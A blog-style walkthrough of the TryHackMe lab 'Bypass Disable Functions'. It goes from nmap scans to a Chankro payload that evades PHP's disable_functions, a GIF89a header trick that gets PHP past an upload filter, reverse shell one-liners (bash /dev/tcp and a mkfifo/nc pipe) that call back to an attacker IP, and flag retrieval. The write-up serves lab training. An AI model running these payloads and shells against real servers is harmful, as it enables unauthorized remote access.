---
title: "TryHackme: Bypass Disable Functions"
author: NeoVirex
categories: [TryHackMe]
tags: [thm]
render_with_liquid: false
media_subpath: /images/tryhackme/tryhackme_bypass_disable_functions/
image:
  path: room_img.png
description: "This room teaches how to bypass PHP disabled functions, commonly used in Web CTFs and real-world restricted environments."
---
# Bypass Disable Functions

Created: April 20, 2024 5:36 PM
Finishing Date: April 22, 2024
Status: Done

### 🛡️ TryHackMe: "Bypass Disabled Functions" Challenge — Full Walkthrough

---

### **1. Initial Reconnaissance with Nmap**

- **Command Used:**
    
    ```bash
    nmap -p- -n -T5 -v --open -oG full-scan.txt [Target_IP]
    
    ```
    
- **Explanation of Options:**
    - `p-`: Scan all 65,536 ports.
    - `n`: Disable DNS resolution to speed up scanning.
    - `T5`: Set aggressive timing for faster scan.
    - `v`: Verbose output.
    - `-open`: Show only open ports.
    - `oG`: Output in grep-able format.
- **Result:** Discovered open ports `22` (SSH) and `80` (HTTP).

---

### **2. Service Enumeration**

- **Command Used:**
    
    ```bash
    nmap -sC -sV -p22,80 [Target_IP]
    
    ```
    
- **Explanation of Options:**
    - `sC`: Run default scripts (basic info gathering).
    - `sV`: Detect version info for each service.
- **Result:** Basic service info gathered — SSH and a web server running on port 80. Next step: manual web enumeration.

---

### **3. Web Exploration & PHP Info Page**

- **Findings:**
    - A **file upload** page is available.
    - A **`phpinfo.php`** file reveals important PHP settings.
- **Critical Insight from `phpinfo()`:**
    - Common execution functions like `exec`, `system`, `shell_exec`, etc. are **disabled** via `disable_functions`.

---

### **4. Exploiting PHP Mail Function with Chankro**

- **What is Chankro?**
    - A tool that **bypasses disabled PHP functions** using `mail()` and environment variable manipulation via `putenv()`.
- **Steps:**
    1. Create a shell script:
        
        ```bash
        #!/bin/bash
        whoami > /var/www/html/[web_path]/winsad.txt
        
        ```
        
        Save as `command.sh`.
        
    2. Run Chankro:
        
        ```bash
        ./chankro -arch 64 -input command.sh -output winsad.php -path /var/www/html/[web_path]/
        
        ```
        
    3. Add **GIF header** to bypass upload filters:
        
        ```bash
        sed -i '1s/^/<?php echo "GIF89a"; ?>\n/' winsad.php
        
        ```
        

---

### **5. Uploading & Executing Payload**

- **Upload Trick:** Rename the PHP payload with `.php` extension, but prepend `GIF89a;` to bypass image validation.
- **Accessing Payload:**
    - Navigate to:
        
        `http://[Target_IP]/[upload_path]/winsad.php`
        
- **Confirm Execution:** Check `winsad.txt` for output.

---

### **6. Getting a Reverse Shell**

- **Update `command.sh`:**
    
    ```bash
    #!/bin/bash
    bash -c 'bash -i >& /dev/tcp/[Your_IP]/443 0>&1'
    
    ```
    
- **Repeat Chankro Build:**
    
    ```bash
    ./chankro -arch 64 -input command.sh -output winsad.php -path /var/www/html/[web_path]/
    
    ```
    
- **Upload Again**, add GIF header, and host a listener:
    
    ```bash
    nc -lnvp 443
    
    ```
    
- **Trigger Shell:**
    - Visit the uploaded PHP file URL in your browser.

---

### **7. Post-Exploitation: Finding the Flag**

- **Shell Session Output:**
    
    ```bash
    www-data@ubuntu:/var/www/html/[path]/uploads$ ls
    acpid.socket  chankro.so  shell.php  try.php
    
    ```
    
- **Navigate to Home Directory:**
    
    ```bash
    cd /home
    ls
    cd s4vi
    ls
    cat flag.txt
    
    ```
    
- **Flag Output:**
    
    ```bash
    head -c 100 flag.txt; echo
    thm{bypass_d1sable_functions_1n_php}
    
    ```
    

---

### **8. Alternative Reverse Shell using Named Pipe**

- **Command:**
    
    ```bash
    rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc [Your_IP] 9001 > /tmp/f
    
    ```
    
- **Listener Setup:**
    
    ```bash
    nc -lnvp 9001
    
    ```
    
- **Note:** Some `nc` versions (like OpenBSD) do **not support `c`** (e.g., `nc -c sh`). Use traditional methods instead.

---

### 📌 Summary:

This challenge tests your ability to:

- Enumerate and identify PHP restrictions.
- Use tools like **Chankro** to bypass disabled functions.
- Upload files while bypassing content filters.
- Establish a **reverse shell** and extract sensitive data (like flags).

All steps above were **essential** for achieving shell access and solving the room.

---

<style>
.center img {display:block; margin:auto;}
.wrap pre{white-space: pre-wrap;}
</style>
